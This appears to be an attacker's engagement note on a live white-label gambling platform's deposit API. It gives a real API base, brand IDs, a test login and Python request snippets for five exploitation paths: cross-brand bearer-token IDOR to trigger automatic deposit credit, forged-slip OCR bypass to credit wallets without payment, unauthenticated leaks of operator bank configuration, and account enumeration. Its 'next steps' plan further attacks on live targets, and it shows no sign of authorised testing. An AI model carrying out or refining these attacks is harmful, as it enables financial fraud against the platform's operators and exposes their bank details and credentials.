# CTMX Platform — SMS Intercept & Deposit Flow Analysis
**Engagement:** WE88Z-VAK88-2026-09  
**Date:** 2026-09-19  
**Status:** Recon complete, exploit scripts ready

---

## Platform Overview

CTMX (`ctmx.cc`) is a white-label SaaS gambling platform serving hundreds of operator brands. Each brand gets a subdomain (`{brand}.ctmx.cc`) backed by a shared API cluster behind CloudFront CDN. The platform implements automated deposit crediting — operators configure their own bank intercept method.

- **API base:** `https://d1cko8y2v39is.cloudfront.net`
- **Operator portals:** `https://{brand}.ctmx.cc`
- **Known operator:** wink999plus (`64edb564cfd6a80012088d91`) → `wink999plus.ctmx.cc`

CTMX is the **only platform with a confirmed live API endpoint** as of 2026-09-19.

---

## Deposit Flow (User Perspective)

```
User → deposit request on casino site
  → GET /player-bank-topup → list of operator bank accounts per brand
  → POST /payment-deposit  → initiate (type_bank_id + price)
  → user does real bank transfer
  → operator backend matches → credits wallet
  OR
  → POST /images (slip upload) + POST /slip-verify → OCR match
```

### type_bank_id Values (Known)

| ID | Method |
|----|--------|
| 3 | KTB QR slip |
| 21 | TrueWallet |
| 146 | Autopeer (auto bank intercept — no slip needed) |
| 147/148 | Autopeer variants |

**Autopeer (146):** deposit auto-credited when operator's Android intercept app posts matching bank notification to CTMX backend. No slip upload required.

---

## CTMX API Authentication

### Headers Required

| Header | Value | Purpose |
|--------|-------|---------|
| `x-exp-signature` | `{brand_id}` (MongoDB ObjectId) | Brand isolation |
| `X-White-Lable-Name` | `cm` | Platform identifier |
| `Authorization` | `Bearer {accessToken}` | User JWT (post-login) |

### Login Flow

```http
POST https://d1cko8y2v39is.cloudfront.net/players-auth
x-exp-signature: 64edb564cfd6a80012088d91
X-White-Lable-Name: cm
Content-Type: application/json

{"username":"<phone>","password":"<pin>","brands_id":"64edb564cfd6a80012088d91"}

→ 201 {"accessToken":"<jwt>", ...}
```

### Auto-Registration on Any Brand

```http
POST /players
{"username":"<phone>","password":"<pin>","brands_id":"<any_brand_id>","pincode":"<pin>"}
```

No invite code required — any brand ObjectId is sufficient to register.

---

## Slip Deposit Flow

```http
# 1. Upload slip image
POST /images (multipart: file + path="slip-check")
→ {"link": "https://.../{imageUrl}"}

# 2. Submit slip verify
POST /slip-verify
{"bank_id": "<casino_bank_id>", "money": <amount>, "imageUrl": "<link>"}
```

The slip verify endpoint performs OCR on the uploaded image to read the amount.

---

## Exploitation Paths

### Path 1: Cross-Brand IDOR via Bearer Reuse

**Mechanism:** Bearer token from brand A may be accepted by brand B when `x-exp-signature` is swapped.

```python
tok = login("64edb564cfd6a80012088d91")  # wink999plus

r = sess.post(CF + "/payment-deposit",
    json={"price": 200, "type_bank_id": 146},
    headers={"Authorization": f"Bearer {tok}",
             "x-exp-signature": OTHER_BRAND_ID,   # IDOR pivot
             "X-White-Lable-Name": "cm"})
```

Tested ~30 brands in `ctmx_autopeer_scan.py` — rate limit is 1 req/30s per player.

### Path 2: Slip Verification Bypass (OCR Spoof)

Upload any JPEG to `/images`, submit forged amount to `/slip-verify`. If OCR reads the forged slip's amount, wallet is credited without a real transfer.

```python
r = sess.post(CF + "/images", multipart=image_data, headers=H)
image_url = r.json()["link"]
r2 = sess.post(CF + "/slip-verify",
    json={"bank_id": CASINO_BANK_ID, "money": 50000, "imageUrl": image_url}, headers=H)
```

Scripts `ctmx_slip_deposit.py`, `ctmx_real_slip.py`, `slipgen.py` are ready.

### Path 3: Brand Config Leak (Unauthenticated)

`/brands-setting/{brand_id}` returns full deposit config with no auth:

```
GET /brands-setting/64edb564cfd6a80012088d91
x-exp-signature: 64edb564cfd6a80012088d91
X-White-Lable-Name: cm
```

Exposes: operator bank accounts, QR code configs, autopeer status, TrueWallet wallet IDs.

### Path 4: Player Registration IDOR + Bank Enum

Auto-register on any brand → GET `/player-bank-topup` → reveals all operator bank accounts for that brand. Map full bank account surface across all brands.

### Path 5: Autopeer Abuse (type_bank_id: 146)

If a brand has autopeer configured and the Bearer cross-brand IDOR works, POST `/payment-deposit` with `type_bank_id: 146` triggers instant credit with no slip verification.

---

## Exploit Scripts (nuxt/)

| Script | Purpose |
|--------|---------|
| `ctmx_autopeer_scan.py` | Cross-brand IDOR — test autopeer across brands with wink JWT |
| `ctmx_brands_unauth.py` | Unauthenticated `/brands-setting` enumeration |
| `ctmx_brand_scan.py` | Authenticated scan — autopeer/no-QR/TW across 30 brands |
| `ctmx_slip_deposit.py` | Slip upload + slip-verify flow (wink999plus) |
| `ctmx_real_slip.py` | Real slip images → slip-verify OCR test |
| `ctmx_reg_scan.py` / `ctmx_reg_scan2.py` | Auto-register + probe deposit endpoints |

---

## Key Credentials / Identifiers

| Item | Value |
|------|-------|
| CF API base | `https://d1cko8y2v39is.cloudfront.net` |
| wink999plus brand_id | `64edb564cfd6a80012088d91` |
| wink test account | `0647922048` / `2310` |
| wink KTB casino bank ID | `650e1beebf995a0013ab7678` |

---

## Pending / Next Steps

1. **Cross-brand IDOR completion** — run `ctmx_autopeer_scan.py` against full brand list (rate limit: 1 req/30s)
2. **Slip OCR bypass** — test `slipgen.py` forged slips → `/slip-verify` with matching bank account
3. **Autopeer operator hunt** — brands with `type_bank_id: 146` configured are high-value targets
4. **Android intercept APK for CTMX** — identify what APK CTMX operators actually use (separate from UFA's ProjectAndroid suite)
5. **TrueWallet on CTMX** — check brands with `type_bank_id: 21` for TW wallet IDs via `/brands-setting`

---

## Relationship to LUX / UFA

| Aspect | LUX (Luxino/ztechdev) | CTMX (ctmx.cc) | UFA |
|--------|----------------------|----------------|-----|
| API | asdgapicenterssdo.com gateways | d1cko8y2v39is.cloudfront.net | ufa345.com etc. |
| APK | LuxSms-v3.apk (Kotlin) | Unknown (operator-specific) | ProjectAndroid.zip suite (Java) |
| C2 auth | Static PAPDIEAW-KEY / Bearer | x-exp-signature + Bearer | No auth (CheckNoticeBank) |
| Deposit intercept | LuxSms webhook | Autopeer (type 146) or slip | CheckNoticeBank / CheckAmtBankVX |
| Active C2 | Offline (530/521) | LIVE | Unknown |
